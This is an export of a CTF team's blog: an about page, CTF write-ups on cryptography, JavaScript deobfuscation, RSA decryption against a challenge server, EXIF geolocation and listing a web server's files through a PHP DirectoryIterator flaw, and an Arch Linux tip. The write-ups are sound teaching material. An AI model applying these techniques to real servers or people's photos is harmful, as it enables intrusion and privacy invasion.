{"meta":{"title":"RawSec","subtitle":"Security is everywhere","description":"a cybersecurity and IT blog","author":"Alexandre ZANNI","url":"https://rawsec.ml"},"pages":[{"title":"","date":"2017-03-26T21:51:22.439Z","updated":"2017-03-26T21:51:22.439Z","comments":true,"path":"about/index.html","permalink":"https://rawsec.ml/about/index.html","excerpt":"","text":"TEAM Rawsec is a French security Capture The Flag team. It was created in January 2016. We frequently participate in both online and offline security Capture The Flag competitions, publish write-ups on CTF tasks. More details about what is a CTF. Rawsec currently has 4 active member: noraj - Alexandre ZANNI - [Captain] - Student Cyber-security engineer - CTFTime profile Chill3d - N.C. - [Member] - Student Cyber-security engineer - CTFTime profile LinkShield - N.C. - [Member] - Student Cyber-security engineer - CTFTime profile 5n0w - N.C. - [Member] - Student Cyber-security engineer - CTFTime profile Feel free to ask for joining the team. We are sometimes available on IRC. Blog Rawsec is also a blog talking about IT and news but it is more focus on security and linux. The blog is also hosting Rawsec's (CTF team) write-ups. The blog is managed by noraj (Alexandre ZANNI). Activities noraj (Alexandre ZANNI) participated in all these events: 2017 Contest Date Location Links DoubleS1405 CTF Sat, 25 Mar. 2017 — Sun, 26 Mar. 2017 On-line CTFTime - website WhiteHat Challenge 02 Sat, 25 Mar. 2017 — Sat, 25 Mar. 2017 On-line CTFTime - website VolgaCTF 2017 Quals Fri, 24 Mar. 2017 — Sun, 26 Mar. 2017 On-line CTFTime - website 0CTF 2017 Quals Sat, 18 Mar. 2017 — Mon, 20 Mar. 2017 On-line CTFTime - website EasyCTF 2017 Mon, 13 Mar. 2017 — Mon, 20 Mar. 2017 On-line CTFTime - website Pragyan CTF 2017 Thu, 02 Mar. 2017 — Tue, 07 Mar. 2017 On-line CTFTime - website Xiomara CTF 2017 Sat, 25 Feb. 2017 — Mon, 27 Feb. 2017 On-line CTFTime - website WhiteHat Challenge 01 Sat, 25 Feb. 2017 — Sat, 25 Feb. 2017 On-line CTFTime - website NeverLAN CTF 2017 Fri, 24 Feb. 2017 — Mon, 27 Feb. 2017 On-line CTFTime - website BSides San Francisco CTF 2017 Sun, 12 Feb. 2017 — Tue, 14 Feb. 2017 On-line CTFTime - website BITSCTF 2017 Sat, 04 Feb. 2017 — Sun, 05 Feb. 2017 On-line CTFTime - website AlexCTF 2017 Fri, 03 Feb. 2017 — Mon, 06 Feb. 2017 On-line CTFTime - website Insomni'hack teaser 2017 Sat, 21 Jan. 2017 — Sun, 22 Jan. 2017 On-line CTFTime - website 2016 Contest Date Location Links 33C3 CTF Tue, 27 Dec. 2016 — Thu, 29 Dec. 2016 On-line CTFTime - website WhiteHat Grand Prix 2016 Sat, 17 Dec. 2016 — Sun, 18 Dec. 2016 On-line CTFTime - website SECCON 2016 Online CTF Sat, 10 Dec. 2016 — Sun, 11 Dec. 2016 On-line CTFTime - website Juniors CTF 2016 Fri, 25 Nov. 2016 — Sun, 27 Nov. 2016 On-line CTFTime - website RC3 CTF 2016 Sat, 19 Nov. 2016 — Mon, 21 Nov. 2016 On-line CTFTime - website Qiwi-Infosec CTF-2016 Thu, 17 Nov. 2016 — Fri, 18 Nov. 2016 On-line CTFTime - website School CTF 2016 Sun, 06 Nov. 2016 — Sun, 06 Nov. 2016 On-line CTFTime - website Hack The Vote 2016 Sat, 05 Nov. 2016 — Mon, 07 Nov. 2016 On-line CTFTime - website European Cyber Week CTF Quals 2016 Fri, 21 Oct. 2016 — Sun, 06 Nov. 2016 On-line website Hack.lu CTF 2016 Wed, 19 Oct. 2016 — Thu, 20 Oct. 2016 On-line CTFTime - website HITCON CTF 2016 Quals Sat, 08 Oct. 2016 — Mon, 10 Oct. 2016 On-line CTFTime - website H4ckIT CTF 2016 Online Fri, 23 Sep. 2016 — Sun, 02 Oct. 2016 On-line CTFTime - website CSAW CTF Qualification Round 2016 Sat, 17 Sep. 2016 — Mon, 19 Sep. 2016 On-line CTFTime - website WhiteHat Contest 12 Sat, 10 Sep. 2016 — Sun, 11 Sep. 2016 On-line CTFTime - website ASIS CTF Finals 2016 Fri, 09 Sep. 2016 — Sun, 11 Sep. 2016 On-line CTFTime - website CTF(x) 2016 Fri, 26 Aug. 2016 — Sun, 28 Aug. 2016 On-line CTFTime - website BioTerra CTF 2016 Sat, 20 Aug. 2016 — Sun, 21 Aug. 2016 On-line CTFTime - website Hackcon 2016 Fri, 19 Aug. 2016 — Sat, 20 Aug. 2016 On-line CTFTime - website IceCTF 2016 Fri, 12 Aug. 2016 — Fri, 26 Aug. 2016 On-line CTFTime - website ABCTF 2016 Fri, 15 Jul. 2016 — Fri, 22 Jul. 2016 On-line CTFTime - website BackdoorCTF 2016 Sat, 04 Jun. 2016 — Sun, 05 Jun. 2016 On-line CTFTime - website SSTIC2016 Thu, 01 Jun. 2016 — Fri, 03 Jun. 2016 Rennes, Bretagne, France website BreizhCTF 2k16 Fri, 29 Apr. 2016 — Sat, 30 Apr. 2016 Rennes, Bretagne, France website 2015 Contest Date Location Links DEFNET 2015 April 2015 Rennes, Bretagne, France event CTF In Cyber-Security, Capture the Flag (CTF) is a special kind of information security competitions. There are two main types of CTFs: Jeopardy and Attack-Defence. CTF contests are usually designed to serve as an educational exercise to give participants experience in securing a machine, conducting and reacting to the sort of attacks found in the real world or improve their pentesting skills. Jeopardy-style CTFs has a couple of questions (tasks/challenges) in range of categories. For example, Web Exploitation, Forensics, Cryptography, Binary Exploitation or something else. Team can gain some points for every solved task. More points for more complicated tasks usually. In some CTFs, the next task in chain can be opened only after some team solve previous task. Then the game time is over sum of points shows you a CTF winer. Attack-defence or Wargame is another interesting kind of competitions. Here every team has own network (or only one host) with vulnarable services. Your team has time for patching your services and developing exploits usually. So, then organizers connects participants of competition and the wargame starts! You should protect own services for defence points and hack opponents for attack points. Historically this is a first type of CTFs, everybody knows about DEF CON CTF - something like a World Cup of all other competitions. CTF games often touch on many other aspects of information security: cryptography, steganography, binary analysis, reverse engeneering, mobile security, programming and others. Good teams generally have strong skills and experience in all these issues. The tracking of the CTF's is often done in the website ctftime.org and write-ups will be written by the players (and sometimes organizers) and will be hosted on team's blog or git repository. Sources: CTFTime - Wikipedia 1 and 2"}],"posts":[{"title":"VolgaCTF 2017 Quals - VC - Crypto","slug":"VolgaCTF-2017-Quals-VC-Crypto","date":"2017-03-25T23:00:00.000Z","updated":"2017-03-26T22:01:33.467Z","comments":true,"path":"en/VolgaCTF-2017-Quals-VC-Crypto/","link":"","permalink":"https://rawsec.ml/en/VolgaCTF-2017-Quals-VC-Crypto/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : VolgaCTF 2017 Quals Website : quals.2017.volgactf.ru Type : Online Format : Jeopardy CTF Time : link Description There are files A.png and B.png. But where's the flag? A.png B.png A.png: B.png: Solution If you know OTP you must know this famous attack on pad reused. You can also see some black lines on image B. Now let's XOR image A and B (with ImageMagick): 1$ convert A.png B.png -fx &quot;(((255*u)&amp;(255*(1-v)))|((255*(1-u))&amp;(255*v)))/255&quot; out.png And now we get the result: Flag is: VolgaCTF{Classic_secret_sharing_scheme}. Note: VC is for Visual Cryptography","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"WhiteHat Challenge 02 - 15 - Web001 - Web","slug":"WhiteHat-Challenge-02-15-Web001-Web","date":"2017-03-25T23:00:00.000Z","updated":"2017-03-26T21:42:01.052Z","comments":true,"path":"en/WhiteHat-Challenge-02-15-Web001-Web/","link":"","permalink":"https://rawsec.ml/en/WhiteHat-Challenge-02-15-Web001-Web/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : WhiteHat Challenge 02 Website : wargame.whitehat.vn Type : Online Format : Jeopardy CTF Time : link Description Have you ever code JavaScript? Find flag in Website: web01.wargame.whitehat.vn. Submit WhiteHat{sha1(flag)} Example: flag = Hello World sha1(&quot;Hello World&quot;) = 0a4d55a8d778e5022fab701977c5d840bbc486d0 You must submit: WhiteHat{0a4d55a8d778e5022fab701977c5d840bbc486d0} (all hash charactera in lowercase) Solution Let's check the JavaScript at: http://web01.wargame.whitehat.vn/hello.js 12345function sayHello() &#123; alert (\"This is a javascript challenge\"); showFlag=String.fromCharCode(118,97,114,32,101,110,99,111,61,39,39,59,13,10,118,97,114,32,101,110,99,111,50,61,49,50,54,59,13,10,118,97,114,32,101,110,99,111,51,61,51,51,59,13,10,118,97,114,32,99,107,61,100,111,99,117,109,101,110,116,46,85,82,76,46,115,117,98,115,116,114,40,100,111,99,117,109,101,110,116,46,85,82,76,46,105,110,100,101,120,79,102,40,39,61,39,41,41,59,13,10,32,13,10,32,13,10,102,111,114,40,105,61,49,59,105,60,49,50,50,59,105,43,43,41,13,10,123,13,10,101,110,99,111,61,101,110,99,111,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,105,44,48,41,59,13,10,125,13,10,32,13,10,102,117,110,99,116,105,111,110,32,101,110,99,111,95,40,120,41,13,10,123,13,10,114,101,116,117,114,110,32,101,110,99,111,46,99,104,97,114,67,111,100,101,65,116,40,120,41,59,13,10,125,13,10,32,13,10,105,102,40,99,107,61,61,34,61,34,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,101,110,99,111,95,40,50,52,48,41,41,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,101,110,99,111,95,40,50,50,48,41,41,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,101,110,99,111,95,40,50,51,50,41,41,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,101,110,99,111,95,40,49,57,50,41,41,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,101,110,99,111,95,40,50,50,54,41,41,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,101,110,99,111,95,40,50,48,48,41,41,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,101,110,99,111,95,40,50,48,52,41,41,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,101,110,99,111,95,40,50,50,50,45,50,41,41,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,101,110,99,111,95,40,49,57,56,41,41,43,34,126,126,126,126,126,126,34,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,101,110,99,111,50,41,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,101,110,99,111,51,41,41,13,10,123,13,10,97,108,101,114,116,40,34,80,97,115,115,119,111,114,100,32,105,115,32,34,43,99,107,46,114,101,112,108,97,99,101,40,34,61,34,44,34,34,41,41,59,13,10,125,13,10); eval(showFlag);&#125; showFlag can be evaluated (with the browser javascript console) to: 12345678910111213141516var enco='';var enco2=126;var enco3=33;var ck=document.URL.substr(document.URL.indexOf('='));for(i=1;i&lt;122;i++) &#123; enco=enco+String.fromCharCode(i,0);&#125;function enco_(x) &#123; return enco.charCodeAt(x);&#125;if(ck==\"=\"+String.fromCharCode(enco_(240))+String.fromCharCode(enco_(220))+String.fromCharCode(enco_(232))+String.fromCharCode(enco_(192))+String.fromCharCode(enco_(226))+String.fromCharCode(enco_(200))+String.fromCharCode(enco_(204))+String.fromCharCode(enco_(222-2))+String.fromCharCode(enco_(198))+\"~~~~~~\"+String.fromCharCode(enco2)+String.fromCharCode(enco3)) &#123; alert(\"Password is \"+ck.replace(\"=\",\"\"));&#125; And the if statement can be evaluated from: 1\"=\"+String.fromCharCode(enco_(240))+String.fromCharCode(enco_(220))+String.fromCharCode(enco_(232))+String.fromCharCode(enco_(192))+String.fromCharCode(enco_(226))+String.fromCharCode(enco_(200))+String.fromCharCode(enco_(204))+String.fromCharCode(enco_(222-2))+String.fromCharCode(enco_(198))+\"~~~~~~\"+String.fromCharCode(enco2)+String.fromCharCode(enco3) to: 1=youaregod~~~~~~~! Because of alert(&quot;Password is &quot;+ck.replace(&quot;=&quot;,&quot;&quot;)); we just need to remove the =. Now we can generate the flag: 12$ printf &quot;WhiteHat&#123;%s&#125;&quot; $(printf %s &apos;youaregod~~~~~~~!&apos; | sha1sum | awk &apos;&#123; print $1 &#125;&apos;)WhiteHat&#123;1c0e74d5f61b6c3901a277bdd490ad070265f027&#125;","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"}]},{"title":"DoubleS1405 CTF - Write-ups","slug":"DoubleS1405CTF-2017-write-ups","date":"2017-03-25T23:00:00.000Z","updated":"2017-03-26T22:09:13.280Z","comments":true,"path":"en/DoubleS1405CTF-2017-write-ups/","link":"","permalink":"https://rawsec.ml/en/DoubleS1405CTF-2017-write-ups/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : DoubleS1405 CTF Website : doubles1405.com Type : Online Format : Jeopardy CTF Time : link 1 - Mic Check - Misc flag{W3lc0me_T0_DoubleS1405_CTF!} 50 - Easy_Crypt - Crypto hui awavmiis hqklse mx o gvslfr tn zrqecuhcef ecdmiwihvg ysrk ac lgnvb e grvnsm fe mehjzrsjrr hoyjzv twupzvg oexsx fm xys qmoxsew tt u bdcncwl. dx wf e kcld nj gcqgvpduegsnzb wlpxbdxigmtb. zczk zg mmgpc_imlshvqi It's Vigenere cipher. Key is: ONEFOURZEROFIVE Cleartext is: 1the vigenere cipher is a method of encrypting alphabetic text by using a series of interwoven caesar ciphers based on the letters of a keyword. it is a form of polyalphabetic substitution. flag is hello_vigenere You can try it by youself. 50 - Crypto? - Crypto https://drive.google.com/open?id=0B4SaQn817BNcUVR2OUIzRTVFNUU #lowercase Source text We can see some ASCII decimals in the text: 12$ cat Crypto.txt| egrep -oh &apos;\\[[0-9]&#123;1,3&#125;\\]&apos; | tr -d &apos;\\n&apos;[123][82][48][43][86][71][80][73][79][95][78][48][74][95][51][68][65][75][84][95][49][73][125][25][88][38][28][29][30][31][32][33][34][35][36][37][38][39][40] So a little ruby script to convert this into a string: 12345open('Crypto.txt', 'r') do |f| text = f.read() chars = text.scan(/\\[([0-9]&#123;1,3&#125;)\\]/).flatten print chars.map&#123;|c| c.to_i.chr&#125;.joinend And the output is: {R0+VGPIO_N0J_3DAKT_1I} plus some garbage. SO we keep only what's between curly braces. And now let's apply a Ceasar bruteforce. The key was +11: {C0+GRATZ_Y0U_3OLVE_1T}. To submit we need to lowercase (see challenge's description). 12irb(main):003:0&gt; &quot;&#123;C0+GRATZ_Y0U_3OLVE_1T&#125;&quot;.downcase=&gt; &quot;&#123;c0+gratz_y0u_3olve_1t&#125;&quot; But that was not good (no flag format...), I needed to remove curly braces and change + into n: c0ngratz_y0u_3olve_1t. 150 - RSA - Crypto RSA 쉽던데..? RSA is easy, huh? #Change Code due to logic error #Change server address due to server overload nc 203.251.182.94 4000 https://drive.google.com/open?id=0B4SaQn817BNcck83M3lyS1dHc1E 12345678910111213141516171819202122&gt; if True:&gt; enc_data = SECRET_LOGIC()&gt; enc = powmod(enc_data, e, n)&gt; conn.send(&quot;enc : %d\\ne : %d\\np : %d\\nq : %d\\n&quot; % (enc, e, p, q))&gt;&gt; recv = conn.recv(1024)&gt;&gt; if end - start &gt; 1:&gt; conn.send(&quot;time out&quot;)&gt; conn.close()&gt;&gt; if recv == enc_data:&gt; conn.send(FLAG)&gt; conn.close()&gt;&gt; conn.send(&quot;wrong&quot;)&gt; conn.close()&gt;&gt; else:&gt; conn.close()&gt; print &quot;error&quot;&gt; I wrote a ruby script to solve this RSA: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#!/usr/bin/rubyrequire 'socket'require 'openssl'require 'base64'# Source of int2Text: http://stackoverflow.com/questions/42993763/how-to-convert-bytes-in-number-into-a-string-of-characters-character-represent#42999986def int2Text(int) a = [] while int&gt;0 a &lt;&lt; (int &amp; 0xFF) int &gt;&gt;= 8 end return a.reverse.pack('C*')end# Source of egcd: https://gist.github.com/jsanders/6735046def egcd(a, b) u_a, v_a, u_b, v_b = [ 1, 0, 0, 1 ] while a != 0 q = b / a a, b = [ b - q*a, a ] u_a, v_a, u_b, v_b = [ u_b - q*u_a, v_b - q*v_a, u_a, v_a ] # Each time, `u_a*a' + v_a*b' = a` and `u_b*a' + v_b*b' = b` end [ b, u_b, v_b ]enddef modinv(a, m) g, x, y = egcd(a, m) if g != 1 raise 'modular inverse does not exist' else return x % m endend# Server connectionhostname = '203.251.182.94'port = 4000s = TCPSocket.open(hostname, port)raw = ''answer_sent = falsewhile line = s.gets # Read lines from the socket puts line.chop # And print with platform line terminator raw += line if raw.match(/q :/) &amp;&amp; answer_sent == false c = raw.match(/^enc : ([0-9]*)$/).captures[0].to_i e = raw.match(/^e : ([0-9]*)$/).captures[0].to_i p_int = raw.match(/^p : ([0-9]*)$/).captures[0].to_i q = raw.match(/^q : ([0-9]*)$/).captures[0].to_i phi = (p_int - 1) * (q - 1) d = modinv(e, phi) n = p_int*q # more efficient than m_int = (c ** d) % n m_int = c.to_bn.mod_exp(d, n).to_i # cleartext is base64 containing an integer m_b64 = int2Text(m_int) puts \"base64 : #&#123;m_b64&#125;\" m = Base64.decode64(m_b64) puts \"int : #&#123;m&#125;\" # integer must be transform to text again m_text = int2Text(m.to_i) puts \"text : #&#123;m_text&#125;\" s.puts m_text answer_sent = true endends.close # Close the socket when done An example of output from my script: 123456789$ ruby rsa.rbenc : 491122313213059047386587355703000827178576243139630115107824179230229619638230359264090916176374104821742487423477640046091956570072907849863979916992012277080517371737063659607380884337353809683315958180812970513119961236305718314856508806575062351521772465118704267216578937782652026891140564554699280499155421872621380063738498801480672462553217846124110631365349374404141214553794903345385240728734320886304119126434949216541748009316097394118225456235324726150812532266854157628444800299612332540488915092939585065747993258534210496110027307168741103227954668422763393074609550128115559442563807710071873205546623595056058012799686847872624717521357873024268621752914303954208374908780786312254128829726625119613542022988078172368143379162734941970190142937076819213707077010206986159149431729867187504847837987139017023926853873484450256772068033378979496285329969789758899711272261594435793646971822229226412599644872158251842719957278621048558842287038138868659481907505634015392299324362317019730935313919966703702616226085783306686686638481716975435704933248720402377816087988961312653435421407390516891418321288636502551122036111983361547523717812270804583522804832003079689675943949319910428221021037993090021553176551473e : 65537p : 32317006071311007300714876688669951960444102669715484032130345427524655138867890893197201411522913463688717960921898019494119559150490921095088152386448283120630877367300996091750197750389652106796057638384067568276792218642619756161838094338476170470581645852036305042887575891541065808607552399123930385521954285833276606292740174507176908054077273016103644389803261062635470374515595892199454891155463898488297024308700957247533881208055894474582694028535079545281620566442541400114261729854235365927395115457109476960042332821732358509197923144094801013581965651112146928918286923938064987973879624251895591220179q : 32317006071311007300714876688669951960444102669715484032130345427524655138867890893197201411522913463688717960921898019494119559150490921095088152386448283120630877367300996091750197750389652106796057638384067568276792218642619756161838094338476170470581645852036305042887575891541065808607552399123930385521990685772174514834944123086486002362345153147580453526134037171595087108668773961917317502849945855689432886442889958513294157709640362363734479327004391952407569596153273880472331909250263593691635107321048666489395316204775782962517724272901158130972610802371589601746375325078943967095960733617174538141999base64 : NTEzMjU2MzI3MTA4MDgzNzE3Mjg4MzE2OTU4MTc4MTEwNTI1NzE4OTEyMTM0MDMzNTY3Mjc3Njc2NTI1MjYxMjI5MjExMzE0MDE1ODk=int : 51325632710808371728831695817811052571891213403356727767652526122921131401589text : qyGUcwNSzMF8uCOxByuBpTZ53Bn2IJauflag&#123;Y34hh_RSA_1S_S0_E4sy&#125; Flag is: Y34hh_RSA_1S_S0_E4sy. 50 - Instead of 5 billion won, I give you a cute handcuffs - Misc In the fall of 2016, an e-mail arrived to detective Kim, who is tracking up economic fugitives who have shed large amounts of money from a large corporation. I know the location of the perpetrator, but I can not tell you, and if you pay me 5 billion, I was attached with a photograph that would tell you the exact location. The attached photo was taken nearest to his refuge. Can Kim find out where the shooter escaped? (The correct answer is the address in Korea. Example: 52-3, Yeonsan-dong, Yeonje-gu, Busan, Republic of Korea) https://drive.google.com/open?id=0B4SaQn817BNceWIxTlE5RVlIbkU 123456789101112131415161718$ exiftool 1.JPG | grep -i gpsGPS Latitude Ref : NorthGPS Longitude Ref : EastGPS Altitude Ref : Above Sea LevelGPS Time Stamp : 04:50:51GPS Speed Ref : km/hGPS Speed : 0GPS Img Direction Ref : True NorthGPS Img Direction : 115.244898GPS Dest Bearing Ref : True NorthGPS Dest Bearing : 115.244898GPS Date Stamp : 2016:11:06GPS Horizontal Positioning Error: 10 mGPS Altitude : 95.3 m Above Sea LevelGPS Date/Time : 2016:11:06 04:50:51ZGPS Latitude : 37 deg 40&apos; 11.91&quot; NGPS Longitude : 127 deg 0&apos; 29.88&quot; EGPS Position : 37 deg 40&apos; 11.91&quot; N, 127 deg 0&apos; 29.88&quot; E Google Maps sucks: DEG40, 94551, Deggendorf, Niederbayern, Bayern, Allemagne findlatitudeandlongitude.com works better: 238-1 Ui-dong, Gangbuk-gu, Seoul, South Korea but we need to respect description format: 238-1, Ui-dong, Gangbuk-gu, Seoul, Republic of Korea. 50 - Cute - Forensic Very cute.. https://drive.google.com/open?id=0B4SaQn817BNcOFJmel91OFA4azA The file is a mkv (Matroska): 1234$ file filefile: Matroska data$ mv file file.mkv There is a subtitle track. We can see with mkvtoolnix that the subtitle track id for mkextract is 2. So I extracted it: 1$ mkvextract tracks &quot;file.mkv&quot; 2:out.srt And we get someting like: 123456789101112131415161718192021222324252627282930313233343536373839100:00:01,000 --&gt; 00:00:01,021e200:00:01,022 --&gt; 00:00:01,042eh300:00:01,043 --&gt; 00:00:01,064eh~400:00:01,065 --&gt; 00:00:01,086eh~!500:00:01,087 --&gt; 00:00:01,108eh~!@[...]8100:00:10,539 --&gt; 00:00:10,539f8200:00:10,539 --&gt; 00:00:10,539l8300:00:10,539 --&gt; 00:00:10,539a8400:00:10,539 --&gt; 00:00:10,539g[...] So we can see flag from the entry 81. Flag is written between entries 81 and 110: flag{v3r_cut3_p4Rr0t_12nt_!t?}. Flag is v3r_cut3_p4Rr0t_12nt_!t?. 100 - iterator - Web Warning : we didn't flag this challenge! The server is executing: 1234567891011121314&lt;?php$directory = $_GET['dir'];$cond = explode(\"=\", urldecode($_SERVER['QUERY_STRING']));if (!is_dir($cond[1])) echo 'folder does not exist.';else &#123; $directory = new DirectoryIterator($directory); foreach($directory as $file) &#123; echo \"\\n&lt;!--\"; if (preg_match(\"/txt$/i\", $file-&gt;getFilename())) echo $file-&gt;getFilename(); else; echo \"--&gt;\"; &#125;&#125;?&gt; Ok so let's try /var/www/html: 123456&lt;!--534dddm3.txt--&gt;&lt;!----&gt;&lt;!----&gt;&lt;!----&gt;&lt;!----&gt;&lt;!----&gt; Now try to reach http://175.214.81.36/534dddm3.txt: 12Hello! If you are reading this article you have succeeded in reading the file.what is left is finding a hidden diretory! We didn't manage to find the hidden directory.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"web","slug":"web","permalink":"https://rawsec.ml/tags/web/"},{"name":"crypto","slug":"crypto","permalink":"https://rawsec.ml/tags/crypto/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"},{"name":"misc","slug":"misc","permalink":"https://rawsec.ml/tags/misc/"}]},{"title":"ArchLinux - Pacman error: $filename exists in filesystem","slug":"archlinux-pacman-error-filename-exists-in-filesystem","date":"2017-03-20T23:00:00.000Z","updated":"2017-03-21T23:03:54.744Z","comments":true,"path":"en/archlinux-pacman-error-filename-exists-in-filesystem/","link":"","permalink":"https://rawsec.ml/en/archlinux-pacman-error-filename-exists-in-filesystem/","excerpt":"","text":"Before each update, check Archlinux news, there may be special instructions. When updating you system with # pacman -Syu you may sometimes encounter this error: 1234error: could not prepare transactionerror: failed to commit transaction (conflicting files)libname: /absolut/file/path exists in filesystemErrors occurred, no packages were upgraded. pacman has detected a file conflict, and is preventing you to overwrite those files. So it's user responsability to take a decision. To solve this you have to check that those files are not used by any installed package with the command: $ pacman -Qo /absolut/file/path. If no package is using the file you will get this normal error: 12$ pacman -Qo /absolut/file/patherror: No package owns /absolut/file/path Now you can rename the file (mv /path/file.ext /path/file.ext.bck), then try the update again # pacman -Syu and then remove the, now, useless file (rm /path/file.ext.bck). But if the file is used report a bug.","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"archlinux","slug":"linux/archlinux","permalink":"https://rawsec.ml/categories/linux/archlinux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"archlinux","slug":"archlinux","permalink":"https://rawsec.ml/tags/archlinux/"}]},{"title":"EasyCTF 2017 - Write-ups","slug":"EasyCTF-2017-write-ups","date":"2017-03-20T23:00:00.000Z","updated":"2017-03-21T22:26:02.646Z","comments":true,"path":"en/EasyCTF-2017-write-ups/","link":"","permalink":"https://rawsec.ml/en/EasyCTF-2017-write-ups/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : EasyCTF 2017 Website : easyctf.com Type : Online Format : Jeopardy CTF Time : link 5 - IRC - Miscellaneous EasyCTF has an IRC channel! Check out #easyctf2017 on freenode to claim a free flag, and stick around to get on-the-fly updates during the competition. Flag: easyctf{irc_d0esn7_apist0rm_:)} 10 - Hello, world! - Programming Use your favorite programming language to print Hello, world! to stdout! Use the programming interface to do this! Programming Judge codes: 1234567&gt; AC: accepted&gt; WA: WRONG ANSWER (you&apos;re bad)&gt; TLE: time limit exceeded (make your code faster)&gt; RTE: runtime error&gt; JE: judge error (contact an admin if you encounter this)&gt; CE: compilation error&gt; Python3 code: 12# python3print(\"Hello, world!\") 15 - Things Add Up - Programming For this problem you will utilise the programming interface, which you can access via the navigation bar at the top of your screen. The input for your program will be given via STDIN - that's cin, input(), and System.in for cxx, Python, and Java respectively. Output goes to STDOUT - cout, print, and System.out. Your program will be run on several sets of input, and if your output matches ours for each testcase, this problem will be marked solved. We'll start with a simple challenge. Each testcase has two lines of input. The first will contain an integer N. The second will contain a sequence of integers a_1, a_2, ..., a_N. You are to output the sum of that sequence - that is, a_1 + a_2 + ... + a_n. Good luck! Input Constraints 0 &lt; N &lt; 100 -1000 &lt; a_i &lt; 1000 Sample Input 123&gt; 5&gt; 2 4 7 3 1&gt; Sample Output 17 Python3 code: 123456789101112# totaltot = 0# NN = int(input())# sequencea_ = input().split(' ')for i in a_: tot += int(i)print(tot) 20 - Flip My Letters - Cryptography I dropped my alphabet on its head, can you help me reassemble it? easyctf{r_wlmg_vevm_mvvw_zm_zhxrr_gzyov} Hint: What happens if you turn the alphabet upside down? It is some Backward Alphabet Code. I used theproblemsite.com to solve this: easyctf{i_dont_even_need_an_ascii_table}. 20 - Clear and Concise Commentary on Caesar Cipher - Cryptography I tried to hide a flag sneakily, can you find it? Download It's easy to find a bunch of ciphertext: omz kag odmow ftue oubtqd h fns sghr qhfgs sghr shld WKLV LV QRW WKH IODJ xaywqoa fqheqo eo ykkh hega pdwp ldnv bdzrzq hr dzrx RNFLPGS{LBHTBGVG} omt vbvdi gmbbbbbbbbbbbbh Just crack the ceasar code (with some ruby): 12345678910111213# from https://gist.github.com/matugm/db363c7131e6af27716cdef caesar_cipher(string, shift = 1) alphabet = Array('a'..'z') encrypter = Hash[alphabet.zip(alphabet.rotate(shift))] # \" \" =&gt; c because I don't want to void non-letters chars string.chars.map &#123; |c| encrypter.fetch(c, c) &#125;endciphertext = 'RNFLPGS&#123;LBHTBGVG&#125;'.downcase(1...26).each do |n| puts caesar_cipher(ciphertext, n).joinend Output: 12345678910111213141516171819202122232425sogmqht&#123;mciuchwh&#125;tphnriu&#123;ndjvdixi&#125;uqiosjv&#123;oekwejyj&#125;vrjptkw&#123;pflxfkzk&#125;wskqulx&#123;qgmyglal&#125;xtlrvmy&#123;rhnzhmbm&#125;yumswnz&#123;sioaincn&#125;zvntxoa&#123;tjpbjodo&#125;awouypb&#123;ukqckpep&#125;bxpvzqc&#123;vlrdlqfq&#125;cyqward&#123;wmsemrgr&#125;dzrxbse&#123;xntfnshs&#125;easyctf&#123;yougotit&#125;fbtzdug&#123;zpvhpuju&#125;gcuaevh&#123;aqwiqvkv&#125;hdvbfwi&#123;brxjrwlw&#125;iewcgxj&#123;csyksxmx&#125;jfxdhyk&#123;dtzltyny&#125;kgyeizl&#123;euamuzoz&#125;lhzfjam&#123;fvbnvapa&#125;miagkbn&#123;gwcowbqb&#125;njbhlco&#123;hxdpxcrc&#125;okcimdp&#123;iyeqydsd&#125;pldjneq&#123;jzfrzete&#125;qmekofr&#123;kagsafuf&#125; So flag is easyctf{yougotit}. 25 - Hexable - Reverse Engineering I tried to hide a flag sneakily, can you 